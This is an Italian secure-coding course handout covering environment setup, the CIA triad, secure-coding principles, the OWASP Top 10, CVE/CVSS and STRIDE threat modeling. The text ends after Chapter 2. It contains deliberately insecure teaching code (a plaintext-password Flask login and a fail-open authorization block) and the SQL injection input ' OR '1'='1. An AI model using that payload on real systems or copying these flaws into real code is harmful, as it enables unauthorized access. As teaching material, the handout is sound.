---
title: "Secure Coding — Dispensa del corso"
subtitle: "Corso IFTS STEM — Modulo Secure Coding (16 ore)"
author: "Ing. Alessandro Manneschi"
date: "Anno formativo 2024/2025"
---

# Secure Coding

## Dispensa completa del corso (16 ore)

**Corso**: IFTS STEM — Specialista nelle Tecniche di Evoluzione e Manutenzione del Software
**Modulo**: Secure Coding (16 ore, all'interno di UF 10/11/12)
**Autore**: Ing. Alessandro Manneschi
**Edizione**: Anno formativo 2024/2025
**Partenariato**: Assoservizi S.r.l. · Polo Tecnologico Manetti Porciatti · Università di Siena · ITS Prodigi · Opus Automazione

---

## Introduzione — come leggere questa dispensa

Stai per leggere una dispensa di **secure coding**: come si scrive codice che non venga bucato. Non è un manuale teorico astratto, e non è un libro di pentest "rompiamo tutto e basta". È **una via di mezzo operativa**: ti faccio vedere come gli attaccanti pensano, ma soprattutto ti insegno a scrivere codice che resista ai loro attacchi.

### A chi è rivolta

A te che stai facendo l'IFTS STEM. Hai già visto Python, ti stai affacciando a Java, JavaScript, PHP. Conosci la sintassi, sai scrivere uno script che gira, magari un mini web service con Flask. Quello che probabilmente non sai ancora è che **lo stesso codice "funzionante" può essere un disastro di sicurezza**, e i casi reali in cui questo è successo riempiono le cronache (Equifax, Heartland, TalkTalk, decine di breach italiani).

### Come è organizzata

8 capitoli più appendici, uno per ogni lezione di 2 ore. Ogni capitolo segue lo stesso pattern:

1. **Cosa imparerai** — gli obiettivi della lezione in 3-5 punti.
2. **Una storia per cominciare** — un caso reale o un'analogia che spiega *perché* il tema è importante.
3. **Spiegazione passo passo** — i concetti tecnici, sviluppati con esempi.
4. **Laboratorio** — cosa fai in aula (e puoi rifare a casa).
5. **Cosa portarti via** — i 3-5 takeaway memorabili.
6. **Errori comuni** — quelli che fanno tutti i junior, da non fare tu.

### Cosa non troverai

Non troverai pagine e pagine di **normativa pura** prima dei concetti tecnici (la fai capire all'inizio, non al posto della tecnica). Non troverai **tabelle di vulnerabilità da imparare a memoria** senza esempi. Non troverai **frasi tipo "il sistema deve essere sicuro"** senza dirti **come** renderlo sicuro.

### Cosa userai mentre studi

- Il tuo PC (Windows, macOS o Linux — qualsiasi va bene)
- Python 3.12 (lo installiamo nel Capitolo 0 se non già fatto)
- VS Code come editor
- Un browser moderno (Chrome, Firefox, Edge)
- DB Browser for SQLite per "guardare dentro" il database
- Tanta voglia di provare, sbagliare, capire

### Il messaggio finale prima di partire

Lo dico una volta sola: **la sicurezza non è un add-on**. Non è "una cosa che il senior aggiunge alla fine". È un modo di scrivere codice. Se la impari ora, ti porterai un vantaggio enorme rispetto a chi la imparerà dopo il primo breach. Buon lavoro.

---

# Capitolo 0 — Preparare l'ambiente di lavoro

> *Tempo: 30 minuti, da fare a casa o all'inizio della prima lezione.*

Prima di parlare di sicurezza, devi avere un ambiente che funziona. Questo capitolo serve a quello. Non è "sicurezza", ma se salti queste 30 minuti, le 16 ore successive saranno frustranti.

### 0.1 Cosa installeremo

Cinque strumenti, tutti gratuiti, tutti multipiattaforma:

1. **Python 3.12** — il linguaggio principale dei nostri laboratori.
2. **Visual Studio Code** — l'editor di codice, gratuito di Microsoft.
3. **Git** — per scaricare il codice di esempio dal repository del corso.
4. **DB Browser for SQLite** — un'interfaccia grafica per "sbirciare" dentro i database.
5. **Browser moderno** — probabilmente lo hai già.

Da metà corso aggiungeremo anche un paio di **librerie Python** (Flask, bcrypt, pydantic, bleach), ma le installeremo quando ci serviranno.

### 0.2 Installare Python

#### Su Windows

1. Apri il browser e vai su [python.org/downloads](https://www.python.org/downloads/).
2. Clicca sul pulsante giallo "Download Python 3.12.x" (la x è un numero che cambia ogni mese, qualunque versione 3.12 o successiva va bene).
3. Apri il file scaricato (si chiama qualcosa come `python-3.12.x-amd64.exe`).
4. **Importantissimo**: nella prima schermata dell'installer, **spunta la casella "Add Python to PATH"** (si trova in basso). Senza questa casella, niente funzionerà più tardi.
5. Clicca "Install Now" e aspetta che finisca.

#### Su macOS

```bash
brew install python@3.12
```

(Se non hai Homebrew, scarica l'installer da python.org come per Windows.)

#### Su Linux (Ubuntu/Debian)

```bash
sudo apt update
sudo apt install python3.12 python3.12-venv python3-pip
```

#### Verifica che funzioni

Apri **un nuovo** terminale (importante: deve essere nuovo, dopo l'installazione) e scrivi:

```
python --version
```

Devi vedere qualcosa come `Python 3.12.7`. Se invece vedi "comando non trovato" o "Python 2.x", chiudi tutti i terminali e riapri. Se ancora non funziona, su Windows reinstalla Python ricordandoti di spuntare "Add Python to PATH".

### 0.3 Installare VS Code

1. Vai su [code.visualstudio.com](https://code.visualstudio.com).
2. Scarica la versione per il tuo sistema operativo.
3. Installalo con tutti i default.
4. Aprilo. Da "Extensions" (icona dei quattro quadrati sulla barra sinistra), installa l'estensione **Python** di Microsoft.

Tutto qui. Le altre estensioni non ci servono per ora.

### 0.4 Il terminale: cos'è e come si apre

Il "terminale" (chiamato anche "shell" o "prompt dei comandi") è una finestra in cui scrivi comandi al computer. È più potente del cliccare sull'interfaccia grafica, e in informatica si usa tantissimo. Ti serve.

- **Windows**: cerca "PowerShell" nel menu Start, aprilo.
- **macOS**: cerca "Terminal" con Spotlight (`Cmd + Spazio`).
- **Linux**: lo conosci già.

I comandi che useremo più spesso sono pochissimi:

| Comando | Cosa fa |
|---------|---------|
| `cd nome_cartella` | Entra in una cartella |
| `cd ..` | Sale di un livello |
| `dir` (Windows) o `ls` (macOS/Linux) | Mostra il contenuto della cartella |
| `mkdir nome` | Crea una nuova cartella |
| `python file.py` | Esegue uno script Python |
| `pip install nomelib` | Installa una libreria Python |

### 0.5 La tua prima app Python

Apri il terminale, vai sul Desktop e crea una cartella per il corso:

```
cd Desktop
mkdir secure-coding
cd secure-coding
```

Adesso apri VS Code dentro questa cartella. Puoi farlo dal terminale stesso:

```
code .
```

(Il punto significa "questa cartella, qui dove sono adesso".)

In VS Code, crea un nuovo file `hello.py` e scrivi:

```python
print("Pronto per il corso di Secure Coding!")
```

Salva (Ctrl+S o Cmd+S). Torna nel terminale e digita:

```
python hello.py
```

Se vedi "Pronto per il corso di Secure Coding!" → **sei pronto a partire**.

### 0.6 Ambienti virtuali: cosa sono e perché ci servono

Un "ambiente virtuale" (in inglese *virtual environment* o `venv`) è una cartella isolata dove installi le librerie Python di un progetto. Serve perché i progetti diversi spesso usano versioni diverse delle stesse librerie, e mescolarli causa problemi.

**Pensa a un venv come a uno studio di lavoro**: ogni progetto ha il suo, gli attrezzi non si mescolano.

Crealo così (sempre dentro `secure-coding`):

```
python -m venv .venv
```

Si crea una cartella `.venv` (il punto davanti la rende "nascosta" nel filesystem, ma in VS Code la vedi normalmente).

Adesso devi **attivarlo**. La sintassi cambia per sistema operativo:

- **Windows PowerShell**: `.\.venv\Scripts\Activate.ps1`
- **macOS/Linux**: `source .venv/bin/activate`

Se vedi nel prompt qualcosa come `(.venv) PS C:\...>` significa che è attivo. Da adesso in avanti, ogni `pip install` e ogni `python` userà questo ambiente isolato.

**Errore comune su Windows**: se PowerShell dice "running scripts is disabled", esegui **una sola volta** questo comando per autorizzare gli script firmati:

```
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
```

Rispondi "S" alla conferma, poi riprova ad attivare il venv.

### 0.7 Installare Flask e fare una prima pagina web

Con il venv attivo:

```
pip install flask
```

Crea un file `hello_flask.py` in VS Code:

```python
from flask import Flask

app = Flask(__name__)

@app.route("/")
def home():
    return "<h1>Ciao! Sono il mio primo server web.</h1>"

if __name__ == "__main__":
    app.run(debug=True)
```

Esegui:

```
python hello_flask.py
```

Apri il browser su `http://127.0.0.1:5000`. Devi vedere "Ciao! Sono il mio primo server web.".

Per fermare il server, premi `Ctrl+C` nel terminale.

### 0.8 Installare Git e DB Browser (compito a casa)

- **Git**: scarica da [git-scm.com](https://git-scm.com/downloads). Installa con i default. Verifica con `git --version` nel terminale.
- **DB Browser for SQLite**: scarica da [sqlitebrowser.org](https://sqlitebrowser.org/dl/). Installa, aprilo per verificare.

### 0.9 Sei pronto

All'inizio di ogni lezione di laboratorio, ti basterà:

1. Aprire il terminale.
2. Andare nella cartella `secure-coding`.
3. Attivare il venv.
4. Aprire VS Code con `code .`.

Tre comandi, sempre questi. È la tua routine.

---

# Capitolo 1 — Perché il secure coding (Lezione 1, 2h)

## 1.1 Cosa imparerai

- Cosa significa "sicurezza" in informatica e come si misura.
- La differenza tra sicurezza **del codice** e sicurezza **infrastrutturale**.
- I cinque principi fondamentali del *secure coding*.
- Tre casi reali di breach causati da errori di codice.
- Cos'è la "mentalità avversaria" e perché ti serve.

## 1.2 Una storia per cominciare — Equifax 2017

Nel marzo 2017 viene pubblicata online una correzione (chiamata in gergo "patch") per Apache Struts, una libreria che molti siti web usano. La vulnerabilità che la patch corregge si chiama CVE-2017-5638 ed è valutata 10 su 10 di gravità. Significa: chi non installa la patch può essere completamente compromesso da chiunque su Internet.

Equifax è un'agenzia di credito americana, una delle più grandi al mondo. Tratta dati di centinaia di milioni di persone: nome, cognome, codice fiscale (Social Security Number negli USA), data di nascita, indirizzo. Equifax usa Apache Struts. Equifax è obbligata, per contratto e per legge, a installare le patch di sicurezza in tempi rapidi.

Equifax **non installa la patch per due mesi**.

Tra il maggio e il luglio 2017, attaccanti sfruttano la vulnerabilità e rubano i dati di **147 milioni di persone**. La metà degli adulti americani. I dati vengono pubblicati nei mercati neri di Internet, usati per frodi, furti d'identità, ricatti.

Il costo finale per Equifax? Circa **1,4 miliardi di dollari** tra multe, class action, settlement, perdita di valore in borsa, licenziamenti dei dirigenti.

Adesso fai un esercizio mentale. Riassumi cosa è andato storto:

- Apache Struts aveva un bug. Vero, ma succede.
- La patch era disponibile. Già un buon punto.
- Equifax sapeva che doveva installarla. Anche.
- Non l'ha installata in tempo. Eccolo, il bug umano.

Equifax non è stata attaccata da hacker con superpoteri. È stata attaccata da gente che ha cercato online "siti che usano Apache Struts vecchio" e li ha bucati uno dopo l'altro. La vulnerabilità non era la libreria, era **il processo** di Equifax: nessun inventario delle dipendenze, nessuna automazione del patching, nessuna network segmentation che limitasse il danno.

**Tutta questa storia per dirti**: la sicurezza non si fa il giorno del breach. Si fa nei mesi e negli anni prima. È un'abitudine quotidiana di chi scrive codice.

## 1.3 Cosa significa "essere sicuri"

> *"La sicurezza non è una feature: è una proprietà del sistema."*
> — **Bruce Schneier**

Tieniti questa frase. È il riassunto in una riga di tutto il corso. La sicurezza non è qualcosa che "aggiungi" alla fine, come una funzionalità in più (es. "ah, mettiamo anche il login"); è una **proprietà** che il sistema possiede o non possiede, e che si decide al momento del **design**.

In informatica, "sicurezza" non è una cosa sola. È la conservazione di **proprietà** misurabili. Le tre più importanti si chiamano **CIA Triad** (niente a che vedere con l'agenzia americana, è solo un acronimo).

**C — Confidentiality (riservatezza)**: i dati sono visibili solo a chi è autorizzato. Esempio: la lista delle password dei clienti non deve essere accessibile a nessuno tranne al sistema che le verifica.

**I — Integrity (integrità)**: i dati non vengono modificati senza autorizzazione. Esempio: il saldo del tuo conto in banca non deve poter essere modificato dal cliente accanto al tuo, e nemmeno dal dipendente in pausa caffè.

**A — Availability (disponibilità)**: il sistema funziona quando serve. Esempio: il sito di e-commerce deve essere online il Black Friday, non solo nei giorni in cui nessuno compra.

Ogni breach viola almeno una di queste tre. Equifax ha violato la **C** (dati rubati). Un attacco DDoS che mette KO un sito viola la **A**. Un bonifico modificato in transito viola la **I**.

Esiste anche un'estensione, le "tre sorelle", che vale la pena conoscere:

**Authenticity** (sei davvero tu?), **Non-repudiation** (non puoi negare di aver fatto un'azione: c'è il log che lo prova), **Accountability** (le azioni sono attribuibili a una persona specifica).

CIA + queste tre = framework completo.

## 1.4 Sicurezza del codice o sicurezza informatica?

Quando il telegiornale dice "attacco hacker a una banca", potrebbe parlare di due cose molto diverse.

**Caso A: sicurezza informatica (perimetrale, infrastrutturale)**. L'attaccante entra dalla rete: firewall mal configurato, VPN bucata, server esposto, password SSH debole. Chi previene: sistemisti, amministratori di rete, responsabili IT.

**Caso B: sicurezza del software (applicazioni, codice)**. L'attaccante non "entra": manda una richiesta legittima all'applicazione, ma con dati malevoli. Per esempio una SQL Injection nel form di login. Chi previene: **gli sviluppatori**. Cioè tu, fra qualche mese.

Confondere queste due cose porta a errori sistematici. La frase più pericolosa che senti in azienda è: *"abbiamo il firewall, siamo a posto"*. Sbagliata. Il firewall blocca il Caso A, una SQL Injection passa lo stesso perché è una richiesta HTTP legittima sulla porta 443. Lo SQLi entra **attraverso** la porta che il firewall lascia aperta apposta.

Allo stesso modo: *"abbiamo HTTPS, siamo a posto"*. Sbagliata. HTTPS cifra il **canale**. Se l'app dentro è vulnerabile, l'attaccante manda l'attacco cifrato e funziona uguale.

Questo corso parla soprattutto del **Caso B**, perché è dove tu, da sviluppatore, puoi fare la differenza.

## 1.5 La mentalità avversaria

Quando guardi del codice come sviluppatore, ti chiedi: *"fa quello che deve fare?"*. Test funzionali, casi felici, qualche edge case.

Quando guardi del codice come attaccante, ti chiedi: *"cosa fa che non dovrebbe fare?"*.

Sembra la stessa cosa. Non lo è.

Prendiamo un esempio. Questo è un endpoint di login in Flask:

```python
@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    user = User.query.filter_by(username=username).first()
    if user and user.password == password:
        session["user_id"] = user.id
        return redirect("/dashboard")
    return "Login fallito", 401
```

Lo sviluppatore lo testa così:
- Username `mario`, password `segreta` → entra. ✓
- Username `mario`, password `sbagliata` → 401. ✓
- Username `non_esiste`, password qualunque → 401. ✓

Conclude: "funziona, va bene".

L'attaccante invece si chiede:
- E se metto come username `' OR '1'='1`? (SQL injection, lo vedremo a fondo nel Cap 3)
- E se metto un username lunghissimo? (DoS, in linguaggi C overflow)
- E se cambio il metodo HTTP da POST a GET? (Username e password finiscono nell'URL e nei log)
- E se faccio 1.000 tentativi al secondo? (Brute force, manca rate limit)
- E se le password nel DB sono in chiaro? (Data breach catastrofico — vedremo nel Cap 4)
- E se modifico `session["user_id"]` dal mio browser? (Privilege escalation)

**Sette domande, in due minuti, sette potenziali vulnerabilità**. E questo è solo il login.

La mentalità avversaria non è essere paranoici. È solo l'altra metà della professionalità.

## 1.6 I cinque principi del secure coding

Ci sono cinque principi che, se rispetti, eviti la stragrande maggioranza dei guai. Memorizzali, scrivili in un post-it.

**1. Least Privilege (minimo privilegio)**. Ogni componente del sistema deve avere il **minimo** privilegio necessario per fare il suo lavoro, e non un grammo in più. L'utente del database usato dalla webapp deve poter solo leggere e scrivere le sue tabelle, non fare `DROP TABLE`. L'applicazione non deve girare come amministratore di sistema. Una API key per Slack che serve solo a inviare messaggi non deve poter cancellare il workspace.

**2. Defense in Depth (difesa in profondità)**. Mai una difesa sola. Più strati indipendenti, in modo che bucarne uno non comprometta tutto. Per proteggere il login degli utenti: HTTPS sul canale, password con hash robusti, rate limiting sui tentativi, MFA per gli account critici, monitoring degli accessi sospetti. Bucare uno solo di questi cinque strati non basta all'attaccante per entrare.

**3. Fail Secure (fallire in modo sicuro)**. Quando qualcosa va storto, il sistema deve "chiudere", non "aprire". Se il controllo di autorizzazione lancia un'eccezione che non hai previsto, l'utente **non** deve passare.

Esempio di **codice che fallisce in modo aperto** (anti-pattern):

```python
# 🚩 FAIL OPEN — se il check si rompe, l'utente entra LO STESSO
try:
    if not is_authorized(user, resource):
        return 403
    return resource
except Exception:
    return resource   # 💥 disastro silenzioso
```

Sembra "robusto" perché cattura ogni errore, ma è esattamente il contrario: trasforma un controllo di sicurezza in un colabrodo. Versione corretta:

```python
# ✅ FAIL SECURE — se il check si rompe, il sistema CHIUDE
try:
    if not is_authorized(user, resource):
        return 403
    return resource
except Exception as e:
    log.exception("auth check failed")
    return 503   # servizio non disponibile, NON accesso senza autorizzazione
```

In dubbio, il sistema **chiude**, non apre. Vale per autorizzazione, autenticazione, validazione, decisioni critiche di business: il default è sempre "nega + segnala", mai "permetti silenziosamente".

**4. KISS (Keep It Simple, Stupid)**. Più codice scrivi, più bug introduci. Più feature aggiungi, più superficie d'attacco crei. La famosa vulnerabilità Log4Shell del 2021 (CVSS 10.0, mezza Internet in panico per due settimane) nasceva da una feature opzionale di Log4j che permetteva di interpolare comandi remoti nei log. Perché una libreria di logging deve eseguire comandi remoti? Non deve. Era una complessità inutile che ha aperto un buco colossale.

**5. Separation of Duties (separazione dei compiti)**. Nessuna singola persona — o componente — dovrebbe poter completare un'azione critica da solo. In banca: per fare un bonifico oltre una certa soglia servono due approvatori. In sviluppo: chi scrive il codice non è chi fa il deploy in produzione. In architettura: i log non devono essere modificabili dallo stesso processo che li scrive (così un attaccante che compromette il processo non può cancellare le tracce).

Tieni questi cinque principi a mente. Nei prossimi capitoli vedrai violazioni di tutti e cinque, e capirai come correggerle.

## 1.7 Laboratorio della Lezione 1

In aula, a coppie. Il docente assegna a ogni coppia uno dei seguenti casi reali, da raccontare in 5 minuti agli altri:

- **Heartbleed 2014** — bug in OpenSSL, 17% dei server HTTPS al mondo vulnerabili. Cosa è successo?
- **Target 2013** — 40 milioni di carte rubate. Punto d'ingresso: un fornitore di climatizzazione. Cosa è successo?
- **SolarWinds 2020** — attacco supply chain, 18.000 organizzazioni infettate. Cosa è successo?
- **Log4Shell 2021** — RCE con un campo User-Agent. Cosa è successo?

Per ogni caso, la coppia deve rispondere a queste domande:
1. Quale proprietà CIA è stata violata?
2. Quale dei 5 principi del secure coding è stato ignorato?
3. Una misura tecnica concreta che avrebbe evitato il disastro.

Discussione collettiva: ogni coppia espone, il docente sintetizza sulla lavagna.

## 1.8 Cosa portarti via dalla Lezione 1

Cinque idee, di queste devi ricordartele.

Primo: **la sicurezza non è una feature, è una proprietà**. Si progetta, non si aggiunge.

Secondo: **CIA**. Confidentiality, Integrity, Availability. Tre proprietà, e ogni breach ne viola almeno una.

Terzo: **HTTPS e firewall non bastano**. Sono lo strato 1. Tu lavori allo strato 7 (l'applicazione).

Quarto: **mentalità avversaria**. Ogni riga di codice che scrivi, chiediti: cosa fa che non dovrebbe fare?

Quinto: **i cinque principi**. Least Privilege, Defense in Depth, Fail Secure, KISS, Separation of Duties. Tatuali da qualche parte.

## 1.9 Errori comuni da junior

- Pensare che la sicurezza sia "solo per i grandi". Falso: il Garante Privacy multa anche piccole aziende italiane (decine di provvedimenti l'anno).
- Confondere sicurezza con cifratura. La cifratura è uno strumento; la sicurezza è la proprietà dell'intero sistema.
- Pensare "tanto a noi non capita". Tutti i breach raccontati sono iniziati con questa convinzione.

---

# Capitolo 2 — OWASP, threat modeling, STRIDE (Lezione 2, 2h)

## 2.1 Cosa imparerai

- Cos'è OWASP e perché tutti la citano.
- Le dieci vulnerabilità più diffuse nel web (OWASP Top 10).
- Cos'è una CVE e come si legge un punteggio CVSS.
- Come si fa un *threat modeling* leggero in 30 minuti.
- Cos'è STRIDE e come applicarlo (con un esempio concreto).

## 2.2 Una storia per cominciare

Immagina di dover costruire una casa. Inizi a costruirla, finestre, pareti, tetto. Poi qualcuno ti chiede: "dove metti il sistema antifurto?". E tu rispondi: "lo aggiungiamo dopo". Inizi a montarlo, ma scopri che le finestre sono troppo larghe per i sensori standard, che il quadro elettrico è dall'altra parte della casa, che gli infissi non hanno i punti di fissaggio. Risultato: o rifai metà casa, o aggiungi un antifurto scadente.

La stessa cosa succede col software. Se pensi alla sicurezza solo alla fine, ti costa dieci volte di più, e funziona la metà. Le statistiche IBM e NIST sono concordi:

- Bug di sicurezza trovato a **design** → costa 1 unità da risolvere.
- Trovato durante il **coding** → costa 5 unità.
- Trovato durante il **testing** → costa 10 unità.
- Trovato in **produzione** → costa 100 unità.

E "costo" non è solo soldi: è tempo, reputazione, downtime, multe GDPR.

Quindi cosa facciamo? Pensiamo alla sicurezza **prima**, durante il design. È l'idea dello "shift left" (sposta a sinistra nel ciclo di sviluppo). Strumento operativo: il **threat modeling**.

## 2.3 OWASP: chi sono e cosa producono

OWASP sta per *Open Web Application Security Project*. È una fondazione no-profit, internazionale, fondata nel 2001. Non vende nulla. Pubblica documenti gratuiti, tool gratuiti, lezioni gratuite. È **lo standard** della sicurezza applicativa nel mondo.

Tra le tante cose che producono, le più famose:

- **OWASP Top 10** — la classifica delle 10 vulnerabilità più diffuse nel web. Aggiornata ogni 3-4 anni.
- **OWASP API Security Top 10** — lo stesso, ma per le API REST.
- **OWASP ASVS** — uno standard per la verifica di sicurezza di un'app.
- **OWASP ZAP** — un tool gratuito per fare scansioni di sicurezza dinamiche.
- **OWASP Cheat Sheet Series** — guide brevi su ogni singola vulnerabilità.

Quando un collega ti dice "abbiamo sistemato OWASP A03 nel nostro codice", sta dicendo che hanno risolto i problemi di "Injection". Se non sai cosa è OWASP Top 10, sembri uno che non ha mai aperto un libro di sicurezza.

## 2.4 La OWASP Top 10 (versione 2021/2025)

Eccoti la lista, con un esempio per ognuna:

**A01 — Broken Access Control**. L'utente A può accedere ai dati dell'utente B. È la #1 dal 2021. Esempio: cambi `?id=42` in `?id=43` nell'URL e vedi le fatture di un altro cliente.

**A02 — Cryptographic Failures**. Password salvate in chiaro, MD5, SHA-1 senza salt. Oppure HTTPS non implementato. Esempio: il DB della tua azienda viene rubato, e le password si decifrano in 5 minuti.

**A03 — Injection**. L'attaccante inietta codice nei tuoi input: SQL, comandi shell, codice JavaScript. Esempio: SQL Injection (che vedremo nel prossimo capitolo a fondo).

**A04 — Insecure Design**. Mancano controlli a livello architetturale. Esempio: non hai fatto threat modeling, e ti scopri che il tuo sistema di reset password permette l'enumerazione degli utenti.

**A05 — Security Misconfiguration**. Configurazioni sbagliate o default lasciati lì. Esempio: il server espone l'header `Server: nginx/1.18.0`, che dice agli attaccanti esattamente quale CVE provare.

**A06 — Vulnerable and Outdated Components**. Usi una libreria con CVE nota. Esempio: il caso Log4Shell del 2021.

**A07 — Identification and Authentication Failures**. Login deboli, password facili, niente MFA. Esempio: il tuo sito permette password come "123456".

**A08 — Software and Data Integrity Failures**. Aggiornamenti non verificati, deserializzazione insicura. Esempio: SolarWinds.

**A09 — Security Logging and Monitoring Failures**. Quando ti attaccano, non te ne accorgi. Esempio: il tempo medio per rilevare un breach è 200+ giorni.

**A10 — Server-Side Request Forgery (SSRF)**. La tua app fetcha URL forniti dall'utente, e l'attaccante le fa fetchare URL interni. Esempio: Capital One 2019, 100 milioni di record rubati.

Nel modulo approfondiremo A03 (SQLi), A01 (IDOR), A02 (crypto), un'altra forma di A03 (XSS) e A06 (supply chain). Sono i 5 più importanti per un developer junior.

## 2.5 CVE e CVSS in due minuti

**CVE** sta per *Common Vulnerabilities and Exposures*. È l'identificatore univoco di una vulnerabilità nota. Il formato è `CVE-AAAA-NNNNN`: anno della scoperta + numero progressivo.

Esempi famosi:

- `CVE-2014-0160` → Heartbleed
- `CVE-2017-5638` → Apache Struts (Equifax)
- `CVE-2021-44228` → Log4Shell
- `CVE-2024-3094` → XZ Utils backdoor

Quando esce una CVE, viene pubblicata sul **NVD** (National Vulnerability Database, nvd.nist.gov). Tu come sviluppatore puoi cercare se le tue dipendenze hanno CVE note (vedremo nel Cap 6 lo strumento `pip-audit` che lo fa automaticamente).

**CVSS** sta per *Common Vulnerability Scoring System*. È un sistema standard per misurare la **gravità** di una CVE. Va da 0.0 a 10.0:

| Punteggio | Severity |
|-----------|----------|
| 0.0 | None |
| 0.1 – 3.9 | Low |
| 4.0 – 6.9 | Medium |
| 7.0 – 8.9 | High |
| **9.0 – 10.0** | **Critical** |

Una CVE con CVSS 10.0 significa che è **sfruttabile da remoto, senza autenticazione, senza interazione utente, con impatto critico**. Log4Shell era 10.0. Quando ne esce una così, le aziende interrompono tutto e patchano subito.

In pratica, come developer, ti basta sapere queste cinque cose:
1. CVE = identificatore di una vulnerabilità nota.
2. NVD = database dove cercarla.
3. CVSS = punteggio di gravità.
4. ≥7.0 (High/Critical) = patcha entro 7-30 giorni.
5. = 10.0 = patcha **adesso**.

## 2.6 Threat modeling: le quattro domande

Threat modeling è un'attività strutturata in cui ti chiedi: *"cosa potrebbe andare storto in questo sistema, dal punto di vista della sicurezza?"*. Si fa **prima** di scrivere codice, su carta o lavagna, in 30-60 minuti.

Adam Shostack, uno dei padri della disciplina, propone quattro domande:

1. **Cosa stiamo costruendo?** Disegna il sistema. Il più semplice possibile.
2. **Cosa può andare storto?** Per ogni componente, elenca le minacce.
3. **Cosa facciamo a riguardo?** Per ogni minaccia: la mitighi? La accetti? La elimini cambiando design?
4. **Abbiamo fatto un buon lavoro?** Rivedi insieme al team, aggiorna quando il sistema cambia.

Punto 1: per disegnare il sistema, si usa un **Data Flow Diagram** (DFD). Ha quattro simboli:

- Un **rettangolo** rappresenta un'entità esterna (un utente, un sistema terzo).
- Un **cerchio** rappresenta un processo (codice che fa qualcosa).
- Due **linee parallele** rappresentano un datastore (un database, un file).
- Una **freccia** rappresenta un flusso di dati.

Sul disegno tracci anche delle linee tratteggiate chiamate **trust boundary**: separano zone con livelli di fiducia diversi. Esempio: tra Internet e il tuo server c'è un trust boundary; tra la webapp e il database c'è un altro trust boundary. Ogni volta che un dato attraversa un boundary, è un'opportunità d'attacco. Lì serve validazione, autenticazione, cifratura, o tutte e tre.

Punto 2: per elencare le minacce, serve uno strumento. Quello che useremo è **STRIDE**.

## 2.7 STRIDE: sei lettere, sei categorie di minacce

STRIDE è un acronimo inventato da Microsoft negli anni '90. Sei lettere, sei tipi di minacce:

**S — Spoofing**: fingersi qualcun altro. Viola la *Authenticity*. Esempi: account takeover via password rubata, phishing con dominio simile al vero, DNS spoofing.

**T — Tampering**: modificare dati senza permesso. Viola l'*Integrity*. Esempi: modifica del cookie di sessione per impersonare un altro utente, modifica del prezzo nel POST di un acquisto, modifica del codice di una libreria scaricata (supply chain).

**R — Repudiation**: negare di aver fatto un'azione, e tu non puoi provare il contrario. Viola la *Non-repudiation*. Esempi: "non sono stato io a fare quel bonifico" (e tu non hai log), modifica dei log per nascondere tracce.

**I — Information Disclosure**: esposizione di dati che non dovrebbero essere visibili. Viola la *Confidentiality*. Esempi: SQL Injection che estrae il database, stack trace mostrato al client con segreti dentro, backup non cifrato lasciato pubblico su S3.

**D — Denial of Service**: rendere il sistema indisponibile. Viola l'*Availability*. Esempi: DDoS volumetrico, esaurimento delle connessioni TCP, query SQL che mette in ginocchio il database.

**E — Elevation of Privilege**: ottenere privilegi maggiori del previsto. Viola l'*Authorization*. Esempi: IDOR (un utente normale legge dati di altri), bypass di un controllo di autorizzazione, SQL Injection che permette login come admin.

STRIDE non è una formula magica. È un **checklist** che ti aiuta a non dimenticare nessuna categoria di minaccia quando ragioni su un sistema.

## 2.8 STRIDE light — esempio pratico passo passo

Adesso facciamolo. Prendiamo un sistema piccolo: un blog con login. L'utente si registra, fa login, scrive post, legge post di altri, può lasciare commenti.

**Passo 1 — disegno del DFD** (lo facciamo a parole, immagina i simboli):

```
[Utente Browser] ──HTTPS──► [Webapp Flask] ◄──── [DB Posts]
                                 │
                                 ▼
                           [DB Users]

  ═══ Trust boundary: Internet/Server ═══
                                 │
  ═══ Trust boundary: Server/DB ═══
```

Quattro elementi principali: utente (entità esterna), webapp (processo), DB users e DB posts (due datastore). Due trust boundary: tra Internet e server, tra server e database.

**Passo 2 — applicazione di STRIDE elemento per elemento**. Compiliamo una tabella:

| Elemento | STRIDE | Minaccia concreta | Mitigazione |
|----------|--------|--------------------|-------------|
| Utente | S | Account takeover via password rubata | Password robuste, bcrypt, MFA |
| Utente | R | "Non sono stato io a cancellare quel post" | Audit log con timestamp e IP |
| Webapp | S | DNS spoofing → utente va su sito fake | HTTPS valido + HSTS |
| Webapp | T | Modifica cookie di sessione | Cookie firmato con secret server-side |
| Webapp | I | Stack trace mostrato in errore 500 | Error handler generico in produzione |
| Webapp | D | Brute force sul login | Rate limit (es. 5 tentativi/min per IP) |
| Webapp | E | SQLi che permette login come admin | Query parametrizzate (Cap 3) |
| DB Users | T | Modifica diretta del DB | Permessi filesystem, audit |
| DB Users | I | Backup non cifrato esposto | Cifratura backup |
| Flusso utente→webapp | I | Sniffing su Wi-Fi pubblico | HTTPS (TLS 1.2+) |
| Flusso webapp→DB | I | Cattura traffico DB | TLS sul canale DB, segregazione rete |

**Passo 3 — priorità**. Per ogni minaccia, stima probabilità (Bassa/Media/Alta) e impatto (Basso/Medio/Alto/Critico). Il prodotto è il rischio. Ordina, le minacce con rischio più alto vanno mitigate per prime.

**Passo 4 — review**. Dopo qualche settimana di sviluppo, riguardi il modello. Magari hai aggiunto una feature di upload immagini: aggiungi le minacce relative (file pericolosi, path traversal, riempimento disco).

Bene: in **15 minuti** abbiamo prodotto una mappa che vale ore di refactor.

## 2.9 Laboratorio della Lezione 2

In aula, a coppie. Sistema da analizzare:

> Un piccolo e-commerce vende prodotti biologici. Funzionalità: registrazione utente, login, ricerca prodotti, ordine, pagamento (tramite API Stripe), email di conferma (tramite SMTP terzo).

Tempo: 30 minuti.

Consegna:

1. Disegnare il DFD (almeno 4 processi, 2 datastore, 5 flussi, 2 trust boundary).
2. Compilare una tabella STRIDE con almeno 8 minacce, sparse tra tutte le 6 categorie.
3. Per ogni minaccia, indicare una mitigazione plausibile.

Discussione collettiva: ogni coppia presenta 1 minaccia "che non aveva pensato prima di STRIDE".

## 2.10 Cosa portarti via dalla Lezione 2

Primo: **OWASP Top 10**. Imparale a memoria, almeno i primi 5. Sei tra colleghi e si parla di "A01" — devi sapere di cosa stanno parlando.

Secondo: **CVE e CVSS**. CVE = identificatore, CVSS = punteggio. ≥7 si patcha entro un mese, =10 si patcha subito.

Terzo: **threat modeling con quattro domande**. Cosa costruiamo, cosa va storto, cosa facciamo, abbiamo fatto bene.

Quarto: **STRIDE come checklist**. Sei lettere, sei categorie. Non dimenticare nessuna.

